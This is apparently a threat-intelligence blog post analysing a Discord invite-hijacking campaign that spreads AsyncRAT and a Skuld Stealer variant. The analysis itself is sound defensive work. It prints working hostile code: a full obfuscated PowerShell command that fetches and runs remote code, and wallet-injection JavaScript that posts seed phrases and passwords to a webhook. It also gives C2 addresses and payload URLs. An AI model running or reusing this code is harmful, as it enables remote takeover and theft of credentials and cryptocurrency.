---
layout: post
title: "Discord Invite Hijacking: How Fake Links Are Delivering Infostealers"
description: "An analysis on how malicious actors abuse Discord invite links to distribute information-stealing malware."
date: 2025-08-05
categories: [Malware Analysis, Threat Intelligence]
classes: wide
header:
  teaser: /assets/images/discord-invite-hijacking-teaser.png
ribbon: Purple
toc: true
---




The attackers employed a sophisticated combination of the **ClickFix phishing technique**, **multi-stage loaders**, and **time-based evasion tactics** to covertly deploy **AsyncRAT** alongside a customized variant of **Skuld Stealer**, specifically engineered to target **cryptocurrency wallets**.

You can read Our blog about **ClickFix** Captcha from [here](https://darkatlas.io/blog/delivering-trojans-via-clickfix-captcha)

**Introduction**

**Discord**, a trusted and heavily utilized communication platform, has become a staple for **gamers**, **online communities**, **developers**, and even **businesses** seeking real-time, secure collaboration. However, its popularity and open nature have also made it an attractive vector for cybercriminals. In recent campaigns, threat actors have abused Discord’s infrastructure—particularly its invite system and content delivery features—to host phishing pages, distribute malware, and exfiltrate stolen data. This report explores how adversaries are leveraging **fake Discord invites**, **malicious payload delivery**, and **social engineering techniques** as part of evolving phishing campaigns aimed at compromising user accounts and stealing sensitive data, particularly in the **cryptocurrency and gaming ecosystems**.

**Understanding Discord Invite Links**

Discord invite links are unique URLs used to grant access to servers, communities, or group chats. Legitimate Discord invites typically follow one of the following URL formats:

`https://discord.com/invite/<code>`

`https://discord.gg/<code>`

![](https://blog-wp.darkatlas.io/wp-content/uploads/2025/06/Screenshot_1.png "Click to enlarge")

**Permanent Discord invite links**

example: [https://discord.gg/communityname](https://discord.gg/communityname)

![](https://blog-wp.darkatlas.io/wp-content/uploads/2025/06/image-8.png "Click to enlarge")

However, attackers frequently exploit the familiarity of this format by crafting **lookalike links** that mimic Discord’s branding or domain structure (e.g., `discord-giveaway[.]net`, `discordnitro[.]gift`, or `discordapp-login[.]com`).

**Custom vanity invite links**  
**Custom vanity invite links** are a feature available to verified or partnered Discord servers, allowing them to create a short, branded URL for easy sharing and recognition. These links typically follow a clean format such as:

![](https://blog-wp.darkatlas.io/wp-content/uploads/2025/06/image-9-1024x510.png "Click to enlarge")

Vanity URLs increase trust and are commonly used by influencers, gaming communities, crypto projects, and official support channels. However, their recognizable format is often **exploited by attackers** who register **lookalike domains** or use **typosquatting techniques** (e.g., `discord.gg/br4ndname`, `discordgifts.net/brandname`) to deceive users.

**Exploitation of Expired and Unclaimed Invite Codes**

Threat actors are actively exploiting a **lesser-known Discord behavior** that allows **reuse of expired or deleted invite codes**—particularly in the context of **vanity URLs** and **boosted servers**.

When a **temporary invite** expires, its unique code becomes **available for reuse**. If an attacker operates a Discord server with **Level 3 Boost status**, they can **register the expired code as a custom vanity invite**, effectively hijacking the original invite string.

This issue becomes even more critical in cases where:

- A legitimate server **loses its Level 3 Boost**, causing its vanity link to become unclaimed.
- Threat actors **quickly register** the now-available vanity invite for their own **malicious server**.
- Users who follow **previously trusted invite links** from blogs, websites, or community pages are redirected to **fake Discord servers** operated by adversaries.

**Misleading Behavior in Invite Code Settings (Client-Side Risk)**

An additional security risk stems from **inconsistent behavior in Discord’s invite link generation interface**, affecting both the **web** and **desktop** versions of the client. When a user creates a new **temporary invite** via the _“Invite People”_ option in a server’s menu and then selects the checkbox **“Set this link to never expire,”** the client UI indicates that the invite has been made permanent.

![](https://blog-wp.darkatlas.io/wp-content/uploads/2025/06/image-10.png "Click to enlarge")

**Misconceptions Exploited by Attackers**

A common misconception among Discord users is that simply **checking the “Set this link to never expire” box** within the invite dialog **converts an already-generated temporary invite into a permanent one**. However, this is **not the case**—and this misunderstanding has been actively exploited in real-world attacks.

Users often proceed to share what they believe is a permanent invite across websites, forums, and social media. These links **expire silently** after the default time window (typically 24 hours or fewer), leaving the invite code unclaimed. **Attackers can then register these expired codes as vanity invites** on malicious servers, leveraging the residual trust associated with the original link.

**Temporary Invite with Lowercase Letters and Digits**

Let’s examine the invite `https://discord.gg/ad2ds5s`. This code contains **only lowercase letters and digits**, and while it remains active, it is protected from being re-registered. However, once this temporary invite **expires** or is **manually deleted**, the code becomes **available** for reuse.

An attacker monitoring the invite can then register `` `ad2ds5s` `` as a **vanity invite** on their own **malicious Level 3 boosted server**. From that point onward, any user clicking the original link will be **redirected to the attacker’s server**—believing they are still joining the legitimate community.

Now consider another example: `` https://discord.gg/`ad2ds5s` ``. This code includes **uppercase letters**. Discord stores **vanity invite codes in lowercase only**, which leads to a critical vulnerability.

Even while the invite `` `ad2ds5s` `` is still active:

- An attacker can claim the lowercase variant (`` `ad2ds5s` ``) as a vanity URL on a boosted server.
- While the original invite is valid, users are routed correctly.
- But **once the original invite expires**, users clicking the same link are silently redirected to the attacker-controlled server using the lowercase vanity version.

Even if the original invite is manually deleted, Discord **reserves** the code until its originally scheduled expiration time. Only **after that timer lapses** will users be redirected to the hijacked vanity destination.

Using the methods above, threat actors exploit **expired or hijacked invite codes** shared by **trusted communities** on platforms like Twitter, GitHub, Reddit, or official websites. Victims, unaware of the redirection, join **fake servers** deliberately crafted to appear authentic.

**Installs malware via deceptive downloads.**  
Only a single channel—usually called `**#verify**`—is unlocked.

A fake bot (commonly named **“Safeguard”**, **“TrustBot”**, or similar) instructs users to **complete a verification** process.

**Safeguard#0786** is a malicious bot used in a Discord malware campaign that was discovered on February 1, 2025. The bot is part of a multi-stage infection chain designed to spread malware through hijacked Discord invite links.

![](https://blog-wp.darkatlas.io/wp-content/uploads/2025/06/image-11.png "Click to enlarge")

**The “Verify” Button Trap: Phishing via Fake Bot Authorization**

Once users join the attacker-controlled Discord server, they are typically funneled into a single visible channel—**#verify**—where they are prompted to click a **“Verify”** button to gain full access. This button is part of a **custom bot**, often disguised with names like _Safeguard_, _TrustBot_, or _VerifyMe_, mimicking legitimate verification tools.

When the user clicks the **“Verify”** button:

- They are **redirected to an external website**, such as:

**[https://captchaguard](https://captchaguard/)[.]me**

The site claims to offer a CAPTCHA or verification service but is in fact a **phishing page** designed to harvest sensitive data.

![](https://blog-wp.darkatlas.io/wp-content/uploads/2025/06/image-12.png "Click to enlarge")

#### **OAuth2 Abuse and UI Spoofing in `captchaguard[.]me`**

Following user interaction with the fake “Verify” bot inside the hijacked Discord server, the attack transitions to a **phishing website** designed to steal user data via OAuth2 abuse and visual deception.

##### **OAuth2 Exploitation via Discord Authorization**

Once the user clicks the verification prompt:

Discord initiates a legitimate **OAuth2 authorization flow**, generating a **single-use authorization code**.

The user is redirected to the attacker’s website with a URL like:

**[https://captchaguard](https://captchaguard/)[.]me/oauth-pass?code=zyA11weHhTZxaY3F**

Once this data is retrieved, the user is silently redirected to another page in the following format:

**[https://captchaguard](https://captchaguard/)[.]me/?key=aWQ9dXNlcm5h…**

Here, the `key` parameter contains **Base64-encoded user and guild metadata**. However, the site **does not validate the contents** of this key—meaning the phishing interface can be loaded with **any or even empty data**, such as:

**[https://captchaguard](https://captchaguard/)[.]me/?key=**

##### Fake Discord UI

The final landing page is a **static HTML site** visually mimicking the **Discord desktop interface**, with:

- A **“Verify” button** centered prominently.
- A **green shield logo** reinforcing trust and security cues.
- No actual validation of OAuth or session state—designed solely to **lure users into additional interaction**.

![](https://blog-wp.darkatlas.io/wp-content/uploads/2025/06/image-13.png "Click to enlarge")

Clicking “**Verify**” executes JavaScript that silently copies a malicious PowerShell command to the user’s clipboard:

```
powershell -NoExit -Command "$r='NJjeywEMXp3L3Fmcv02bj5ibpJWZ0NXYw9yL6MHc0RHa';$u=($r[-1..-($r.Length)]-join '');$url=[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String($u));iex (iwr -Uri $url)"
```

## Payload Analysis

### **Payload 1: AClient.exe (AsyncRAT Variant)**

- **SHA256**: `53b65b7c38e3d3fca465c547a8c1acc53c8723877c6884f8c3495ff8ccc94fbe`
- **Type**: Remote Access Trojan (RAT)
- **Version**: AsyncRAT v0.5.8

**AsyncRAT** is an open-source remote access trojan providing full remote control over infected systems. This variant supports:

- Command execution
- Keylogging and screen capture
- File system manipulation (upload/download/delete)
- Remote desktop and webcam access

#### Dead Drop Resolver Mechanism

Instead of hardcoding its C2 server, the malware uses a **dead drop resolver**. It fetches the C2 address from a **Pastebin link**:

```
https://pastebin.com/raw/ftknPNF7
```

![](https://blog-wp.darkatlas.io/wp-content/uploads/2025/06/image-24-1024x83.png "Click to enlarge")

During analysis, this paste contained:

```
101.99.76.120:7707
```

it is frequently replaced with `0.0.0.0:7707`, likely to avoid detection when idle.

#### Related AsyncRAT Samples

Other related samples observed (same threat actor) include:

SHA256

d54fa589708546eca500fbeea44363443b86f2617c15c8f7603ff4fb05d494c1

670be5b8c7fcd6e2920a4929fcaa380b1b0750bfa27336991a483c0c0221236a

These embed C2 addresses directly:

- `87.120.127.37:7707`
- `185.234.247.8:7707`
- `microads[.]top:7707` (Domain registered: August 15, 2024)

---

### **Payload 2: skul.exe (Skuld Stealer Variant)**

- **SHA256**: `8135f126764592be3df17200f49140bfb546ec1b2c34a153aa509465406cb46c`
- **Type**: Data Stealer
- **Language**: Go
- **Origin**: Based on open-source Skuld Stealer

**Skuld Stealer** is a modular stealer targeting:

- Browsers (Chromium/Gecko): cookies, logins, CCs, history
- Discord: tokens, session injection
- Wallets: Exodus, Atomic (via .asar injection)
- System profiling: HW, IP, Wi-Fi, Geo
- Clipboard monitoring (crypto clipper) _(removed in this variant)_

### Mutex Usage

To prevent multiple instances, the stealer creates a global mutex:

```
3575651c-bb47-448e-a514-22865732bbc
```

```
func IsAlreadyRunning() bool {    const AppID = "3575651c-bb47-448e-a514-22865732bbc"    _, err := windows.CreateMutex(nil, false, syscall.StringToUTF16Ptr(fmt.Sprintf("Global\\\\%s", AppID)))    return err != nil}
```

### Data Exfiltration via Discord Webhooks

This variant uses **two encrypted webhook URLs**, decrypted at runtime using a single-byte XOR cipher:

Purpose

Webhook URL

General data

`https://discord[.]com/api/webhooks/1355186248578502736/_RDywh_K6...`

Crypto wallet seeds

`https://discord[.]com/api/webhooks/1348629600560742462/RJgSAE7c...`

The malware dispatches stolen data in parallel threads:

```
for _, action := range modules {    go action(CONFIG["webhook"].(string))}go walletsinjection.Run(webhook2)
```

---

### Wallet Injection (Exodus & Atomic)

The malware performs **.asar replacement** in two popular crypto wallets:

- **Exodus: `%LOCALAPPDATA%\exodus\app-<version>\app.asar`**
- **Atomic: `%LOCALAPPDATA%\Programs\atomic\resources\app.asar`**

It downloads **malicious .asar files** from GitHub:

Target

URL

Atomic Wallet

`https://github.com/hackirby/wallets-injection/raw/main/atomic.asar`

Exodus Wallet

`https://github.com/hackirby/wallets-injection/raw/main/exodus.asar`

Also, it drops **decoy LICENSE files**:

```
%LOCALAPPDATA%\Programs\atomic\LICENSE.electron.txt%LOCALAPPDATA%\exodus\app-<version>\LICENSE
```

These files embed the webhook URLs and serve as distraction artifacts.

## Advanced Capabilities and Campaign Evolution

#### Malicious `.asar` Injection Logic

The two Discord webhook URLs used by Skuld are stored in modified `.asar` application files and later extracted by injected malicious JavaScript. These `.asar` files are deployed to target wallets like **Exodus** and **Atomic**, replacing legitimate application files with trojanized versions.

#### Exodus Wallet: JavaScript Hooking

In Exodus, the unlock function is modified to capture sensitive credentials:

```
async unlock(e) {   if (await this.shouldUseTwoFactorAuthMode()) return;   const t = await Object(ee.readSeco)(this._walletPaths.seedFile, e);   this._setSeed(M.fromBuffer(t)), P.a.randomFillSync(t), await this._loadLightningCreds()      const webhook = await fs.readFile('LICENSE', 'utf8');   const mnemonic = this._seed.mnemonicString;   const password = e;   const computerName = os.hostname();   const username = os.userInfo().username;   var request = new XMLHttpRequest();   request.open("POST", webhook, true);   request.setRequestHeader("Content-Type", "application/json");   var payload = JSON.stringify({      "username": "skuld - exodus injection",      "avatar_url": "https://i.ibb.co/GJGXzGX/discord-avatar-512-FCWUJ.png",      "content": "`" + computerName + "`" + " - " + "`" + username + "`",      "embeds": [{         "title": "Exodus Injection",         "color": 0xb143e3,         "footer": {            "text": "skuld exodus injection - made by hackirby",            "icon_url": "https://avatars.githubusercontent.com/u/145487845?v=4",         },         "fields": [            { "name": "Mnemonic", "value": "`" + mnemonic + "`" },            { "name": "Password", "value": "`" + password + "`" }         ]      }]   });   request.send(payload);}
```

#### Mnemonic Exfiltration

The seed phrase (mnemonic) is essentially the **master key** under the [BIP‑39](https://github.com/bitcoin/bips/blob/master/bip-0039.mediawiki) standard. Once compromised, an attacker can use this to derive **all private keys** associated with the wallet, granting **full control over assets**.

---

## Campaign Timeline and Modifications

### Upgrading the Downloader

Threat actors periodically refresh the **installer.exe** downloader component. New builds consistently maintain a **zero-detection rate** on VirusTotal, improving stealth.

- **SHA256 of updated installer.exe**:  
    `160eda7ad14610d93f28b7dee20501028c1a9d4f5dc0437794ccfc2604807693`

The installer still fetches encrypted payloads from:

```
https://bitbucket[.]org/syscontrol6/syscontrol/downloads/cks.exe
```

After decryption, the payload has the following hash:

- **Decrypted cks.exe SHA256**:  
    `f08676eeb489087bc0e47bd08a3f7c4b57ef5941698bc09d30857c650763859c`

---

### Bypassing Chrome ABE (Application-Bound Encryption)

Google’s **ABE**, introduced in 2024, prevents cookie theft by binding cookies to specific applications. This disrupts stealers that traditionally accessed `Cookies.sqlite` databases on disk.

#### ChromeKatz Integration

To bypass this, threat actors adopted [`ChromeKatz`](https://github.com/Meckazin/ChromeKatz/), an open-source project designed to extract browser data **directly from memory**.

### In-Memory Cookie Extraction Workflow

1. **Process Enumeration**  
    The stealer scans running processes looking for:
    - `chrome.exe`
    - `msedge.exe`
    - `brave.exe`
2. **Executable Path & Version Retrieval**
    - Uses `K32GetModuleFileNameExW` to get the full path of the browser.
    - Applies `GetFileVersionInfoW` to extract the browser version.
3. **Memory Injection and Dumping**  
    Instead of parsing the encrypted cookie DB, the malware injects into the browser and accesses live memory regions to extract cookies in plaintext.

## Victims and Impact

Identifying individual victims of the Skuld Stealer campaign remains difficult due to the attack’s stealthy design. The use of **Discord webhooks** as a one-way exfiltration channel provides attackers with sensitive data without establishing any inbound or interactive communication—eliminating typical forensic traces and limiting victim attribution.

However, indirect indicators offer insights into the campaign’s scale:

- Payloads hosted on **Bitbucket** serve as a rough metric for campaign reach. Download counts across observed repositories have exceeded **1,300**, suggesting a potentially large pool of impacted systems, though not all downloads necessarily resulted in successful infections.
- **External telemetry data** confirms a **geographically diverse** victim set, with infections spanning:
    - United States
    - Vietnam
    - France
    - Germany
    - Slovakia
    - Austria
    - Netherlands
    - United Kingdom

The targeting of **cryptocurrency wallets**, coupled with the use of a **sophisticated credential stealer**, points to **financially motivated threat actors**, primarily seeking access to users’ digital assets.

---

## Conclusion

This campaign exemplifies a **modern, modular approach** to cybercrime, leveraging multiple legitimate platforms and overlooked technical features to remain both effective and evasive.

### Key Takeaways:

- **Discord Vanity Invite Abuse**: Threat actors exploit a quirk in Discord’s invite system—**reclaiming expired or deleted invite codes**—to mislead users into joining attacker-controlled servers.
- **Multi-Stage Delivery Chain**:
    - Starts with **social engineering**, often via Discord messages.
    - Progresses through a **PowerShell-based downloader**.
    - Utilizes **trusted platforms** (GitHub, Bitbucket, Pastebin) to host encrypted payloads.
- **Simplicity Over Sophistication**: Instead of complex obfuscation, the attackers employ:
    - **Parameter-based behavioral changes**
    - **Execution delays using scheduled tasks**
    - **On-demand decryption during multi-stage execution**
- **Payload Focus**:
    - **AsyncRAT** ensures remote access and persistence.
    - A customized **Skuld Stealer** targets:
        - **Browser credentials*
        - **Discord tokens**
        - **Cryptocurrency wallets** like **Exodus** and **Atomic**, with precise JavaScript injection to capture **seed phrases and passwords**.
- **Persistence Mechanisms**: The use of **scheduled tasks** ensures that even if a component is removed, AsyncRAT is **redownloaded and re-executed**, maintaining attacker access.

While Discord’s response—including the **removal of the malicious bot**—has disrupted the current operation, the **core techniques** remain viable. Future campaigns may reuse the same architecture with minor modifications, posing ongoing risks to both individual users and broader crypto ecosystems.
